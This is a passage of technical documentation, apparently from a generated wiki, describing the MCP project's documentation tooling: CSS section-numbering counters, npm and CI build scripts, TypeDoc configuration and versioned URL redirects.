- First column left-aligned: Client names

This creates a compact, scannable comparison table.

**Sources:** [docs/style.css:13-30]()

### Section Numbering System

Optional hierarchical section numbering is enabled via CSS counters when a page includes `<div id="enable-section-numbers">`:

**Counter Hierarchy:**

The system maintains six counter levels (`h2-counter` through `h6-counter`) that reset appropriately:
- `h2` resets `h3-h6`
- `h3` resets `h4-h6`
- `h4` resets `h5-h6`
- `h5` resets `h6`

**Number Generation:**

`::before` pseudo-elements prepend hierarchical numbers:
- `h2`: `"1. "`
- `h3`: `"1.1 "`
- `h4`: `"1.1.1 "`
- `h5`: `"1.1.1.1 "`
- `h6`: `"1.1.1.1.1 "`

Numbers also appear in the table of contents via `#table-of-contents li[data-depth="N"] a::before` selectors.

**Usage:**

Pages include `<div id="enable-section-numbers" style="display: none;"></div>` to activate numbering. The div is hidden but its presence triggers the `:has()` selector.

**Sources:** [docs/style.css:33-100]()

## Build Pipeline Integration

The documentation systems integrate with the repository's build pipeline through npm scripts and CI workflows.

### Generation Workflow

```mermaid
graph LR
    subgraph "Source Files"
        SchemaTS["schema/*/schema.ts"]
        TemplateMDX["docs/specification/*/schema.template.mdx"]
    end
    
    subgraph "Build Scripts"
        GenSchemas["npm run generate<br/>generate-schemas.ts"]
        TypeDocCLI["typedoc --out tmp<br/>--plugin typedoc.plugin.mjs"]
        Prettier["npm run format<br/>prettier --write"]
    end
    
    subgraph "Generated Outputs"
        SchemaJSON["schema/*/schema.json"]
        SchemaMDX["docs/specification/*/schema.mdx"]
        Formatted["Formatted MDX Files"]
    end
    
    subgraph "CI Validation"
        MainYML["main.yml<br/>Schema checks"]
        MarkdownYML["markdown-format.yml<br/>Format checks"]
    end
    
    SchemaTS --> GenSchemas
    SchemaTS --> TypeDocCLI
    TemplateMDX --> TypeDocCLI
    
    GenSchemas --> SchemaJSON
    TypeDocCLI --> SchemaMDX
    
    SchemaMDX --> Prettier
    Prettier --> Formatted
    
    SchemaJSON --> MainYML
    SchemaMDX --> MainYML
    Formatted --> MarkdownYML
```

**Key npm scripts:**

| Script | Command | Purpose |
|--------|---------|---------|
| `generate` | Runs `generate-schemas.ts` | Generate JSON schemas and MDX templates |
| `format` | `prettier --write docs/` | Format all documentation files |
| `check:format` | `prettier --check docs/` | Validate formatting in CI |

**CI Workflows:**

- `.github/workflows/main.yml`: Validates generated schemas match committed files
- `.github/workflows/markdown-format.yml`: Ensures consistent formatting

**Exclusions:**

Generated files are excluded from manual editing:
- `.prettierignore`: Excludes `docs/specification/*/schema.md` and `.mdx`
- `.gitattributes`: Marks schema files as `linguist-generated=true`

**Sources:** [.prettierignore:1-3](), [.gitattributes:1-5](), Diagram 6 from high-level overview

### TypeDoc Configuration

TypeDoc is configured through `typedoc.config.mjs`:

```javascript
{
  out: "tmp",  // Temporary output (stdout captures actual output)
  excludeInternal: true,
  excludeTags: ["@format", "@maximum", "@minimum", "@TJS-type"],
  disableSources: true,
  logLevel: "Error",
  plugin: ["./typedoc.plugin.mjs"]
}
```

The `schema-page` output format is registered by the plugin and set as default. The `schemaPageTemplate` option points to version-specific template files:

```bash
typedoc \
  --schemaPageTemplate docs/specification/2025-11-25/schema.template.mdx \
  schema/2025-11-25/schema.ts
```

Output is written to stdout and redirected to the final `.mdx` file.

**Sources:** [typedoc.config.mjs:1-19](), [typedoc.plugin.mjs:31]()

## URL and Redirect Management

The redirect system ensures stable URLs while supporting evolving documentation structure.

### Latest Version Redirects

The primary redirect pattern handles versioned specification access:

```json
{
  "source": "/specification/latest",
  "destination": "/specification/2025-11-25",
  "permanent": false
}
```

The non-permanent redirect allows updating the target version without breaking external links. The pattern-based redirect handles sub-paths:

```json
{
  "source": "/specification/latest/:slug*",
  "destination": "/specification/2025-11-25/:slug*",
  "permanent": false
}
```

This enables `/specification/latest/basic/lifecycle` to resolve to the current version's lifecycle documentation.

### Legacy Path Redirects

Additional redirects maintain backward compatibility for renamed or relocated content:

| Old Path | New Path | Type |
|----------|----------|------|
| `/tutorials/building-a-client` | `/docs/develop/build-client` | Permanent |
| `/quickstart` | `/docs/develop/build-server` | Permanent |
| `/docs/concepts/architecture` | `/docs/learn/architecture` | Permanent |
| `/docs/concepts/elicitation` | `/specification/2025-06-18/client/elicitation` | Permanent |
| `/docs/concepts/*` | Various specification/docs paths | Permanent |
| `/introduction` | `/docs/getting-started/intro` | Permanent |

These permanent redirects help maintain SEO and prevent broken external links from previous documentation structures.

**Sources:** [docs/docs.json:368-455]()

---

This technical infrastructure enables the MCP project to maintain high-quality, multi-versioned documentation with clear separation between technical specifications (Mintlify) and community announcements (Hugo blog). The TypeDoc plugin bridges TypeScript type definitions and human-readable documentation, while the styling system ensures visual consistency across generated and hand-written content.